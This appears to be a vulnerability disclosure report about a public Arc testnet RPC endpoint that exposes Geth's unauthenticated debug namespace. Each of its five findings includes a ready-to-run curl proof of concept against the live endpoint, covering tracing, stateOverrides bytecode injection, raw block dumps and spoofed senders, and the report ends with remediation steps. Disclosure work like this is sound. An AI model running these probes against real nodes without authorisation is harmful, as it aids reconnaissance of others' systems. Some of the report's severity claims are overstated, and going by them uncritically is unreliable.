The public JSON-RPC endpoint `https://rpc.testnet.arc.network` exposes the Geth `debug` namespace without any authentication or IP restriction. This namespace is intended exclusively for local/internal node operator use. Its public exposure allows any unauthenticated remote attacker to:
 
1. Retrieve full opcode-level EVM execution traces of every transaction in every block.
2. Inject arbitrary bytecode via `stateOverrides` in `debug_traceCall` and execute it against live contract state — reading any storage slot of any contract.
3. Replay calls against any historical block state (archive node confirmed), enabling full historical state reconstruction.
4. Dump raw block data including all calldata and contract deployment bytecode via `debug_getRawBlock`.
5. Impersonate any `from` address in simulated calls, enabling simulation of access-controlled function calls as if sent by the contract owner or any privileged address.
Combined, these capabilities allow an attacker to fully reconstruct protocol state, extract privileged contract storage, and simulate attacks against the protocol's smart contracts before executing them on-chain.
 
---
 
## Steps To Reproduce
 
### Finding 1 — `debug_traceBlockByNumber` Exposed (Full EVM Opcode Traces)
 
1. Send a POST request to the RPC endpoint:
   ```bash
   curl -s -X POST https://rpc.testnet.arc.network \
     -H "Content-Type: application/json" \
     -d '{"jsonrpc":"2.0","method":"debug_traceBlockByNumber","params":["latest",{}],"id":1}'
   ```
2. Observe the response returns a full `structLogs` array containing every EVM opcode, gas cost, stack state, and storage reads for every transaction in the latest block — with no authentication required.
---
 
### Finding 2 — `debug_traceCall` with Arbitrary Bytecode Injection via `stateOverrides`
 
1. Send the following request to inject custom bytecode against a live contract and read its storage slot 0:
   ```bash
   curl -s -X POST https://rpc.testnet.arc.network \
     -H "Content-Type: application/json" \
     -d '{
       "jsonrpc":"2.0",
       "method":"debug_traceCall",
       "params":[
         {
           "from":"0x000000000000000000000000000000000000dEaD",
           "to":"0xff5cb29241f002ffed2eaa224e3e996d24a6e8d1",
           "data":"0x",
           "gas":"0x100000"
         },
         "latest",
         {
           "stateOverrides":{
             "0xff5cb29241f002ffed2eaa224e3e996d24a6e8d1":{
               "code":"0x60005460005260206000f3"
             }
           }
         }
       ],
       "id":1
     }'
   ```
2. Observe the `returnValue` contains the raw value of storage slot 0 (`0x0000...0003`) of the target contract, read via injected bytecode. No authentication required.
3. The `stateOverrides.code` field can be replaced with any EVM bytecode to read any storage slot, iterate mappings, or simulate complex internal logic against live state.
---
 
### Finding 3 — `debug_getRawBlock` Exposed (Full Raw Block Data)
 
1. Send a POST request:
   ```bash
   curl -s -X POST https://rpc.testnet.arc.network \
     -H "Content-Type: application/json" \
     -d '{"jsonrpc":"2.0","method":"debug_getRawBlock","params":["latest"],"id":1}'
   ```
2. Observe the response returns the full RLP-encoded block including all transaction calldata, contract deployment bytecode, and internal call data — unauthenticated.
---
 
### Finding 4 — Archive Node Historical State Access via `debug_traceCall`
 
1. Send a `debug_traceCall` request targeting block `0x1` (genesis):
   ```bash
   curl -s -X POST https://rpc.testnet.arc.network \
     -H "Content-Type: application/json" \
     -d '{
       "jsonrpc":"2.0",
       "method":"debug_traceCall",
       "params":[
         {
           "from":"0x000000000000000000000000000000000000dEaD",
           "to":"0xff5cb29241f002ffed2eaa224e3e996d24a6e8d1",
           "data":"0x",
           "gas":"0x100000"
         },
         "0x1",
         {
           "stateOverrides":{
             "0xff5cb29241f002ffed2eaa224e3e996d24a6e8d1":{
               "code":"0x60005460005260206000f3"
             }
           }
         }
       ],
       "id":1
     }'
   ```
2. Observe the node responds with storage state at block 1, confirming archive node access. Any historical block can be targeted, allowing full historical state reconstruction.
---
 
### Finding 5 — Arbitrary Address Impersonation in `debug_traceCall`
 
1. Send a `debug_traceCall` with `from` set to the contract's own address to simulate a self-call (bypassing `msg.sender` access controls in simulation):
   ```bash
   curl -s -X POST https://rpc.testnet.arc.network \
     -H "Content-Type: application/json" \
     -d '{
       "jsonrpc":"2.0",
       "method":"debug_traceCall",
       "params":[
         {
           "from":"0xff5cb29241f002ffed2eaa224e3e996d24a6e8d1",
           "to":"0xff5cb29241f002ffed2eaa224e3e996d24a6e8d1",
           "data":"0x",
           "gas":"0x100000"
         },
         "latest",
         {
           "stateOverrides":{
             "0xff5cb29241f002ffed2eaa224e3e996d24a6e8d1":{
               "code":"0x3360005260206000f3"
             }
           }
         }
       ],
       "id":1
     }'
   ```
2. Observe `returnValue` confirms `msg.sender` is the contract's own address — any `from` address is accepted. An attacker can impersonate the contract owner, a multisig, or any privileged address to simulate and plan attacks against `onlyOwner`-gated functions.
---
 
## Supporting Material / References
 
* **Response confirming `debug_traceBlockByNumber`:** structLogs array with full opcode trace returned for latest block, including `PUSH1`, `MSTORE`, `CALLVALUE` etc.
* **Response confirming bytecode injection / storage read:** `returnValue: 0x0000000000000000000000000000000000000000000000000000000000000003` — live contract storage slot 0 read via injected `0x60005460005260206000f3`.
* **Response confirming archive access at block 0x1:** `returnValue: 0x0000...0000` — storage correctly returns zero at genesis state.
* **`debug_getRawBlock` response:** Full RLP hex blob returned including transaction calldata and contract bytecode.
* **Geth documentation — debug namespace:** https://geth.ethereum.org/docs/interacting-with-geth/rpc/ns-debug
* **CWE-16:** https://cwe.mitre.org/data/definitions/16.html
* **CWE-284:** https://cwe.mitre.org/data/definitions/284.html
* **CAPEC-122:** https://capec.mitre.org/data/definitions/122.html
---

## Impact

**Severity: Critical**
 
| Capability Unlocked | Impact |
|---|---|
| Full EVM opcode traces of all transactions | Complete visibility into protocol internals, private logic, and call patterns |
| Arbitrary bytecode injection against live state | Read any contract storage slot without ABI knowledge; extract sensitive protocol parameters, private keys stored in contracts, or admin addresses |
| Archive node historical state access | Full reconstruction of protocol state at any point in history; track fund movements, internal state changes |
| Arbitrary `from` address impersonation | Pre-attack simulation: attacker can simulate calling any privileged function as any address (owner, multisig, governance) to plan and verify exploits before executing on-chain |
| Raw block data exposure | Full calldata of all transactions exposed, including private/unverified contract deployments |
 
The combination of bytecode injection, `stateOverrides`, and archive access effectively gives an unauthenticated attacker a **complete read oracle over the entire protocol state** — past and present. This significantly lowers the bar for finding and exploiting vulnerabilities in the protocol's smart contracts.
 
**Recommended Remediation:**
 
- Disable the `debug` namespace on the public RPC endpoint immediately.
- Restrict `debug`, `admin`, and `personal` namespaces to localhost or authenticated internal interfaces only.
- If `debug_traceCall` is required for public use, disable `stateOverrides` support or restrict it behind authentication.
- Review Geth's `--http.api` flag to allowlist only: `eth,net,web3`.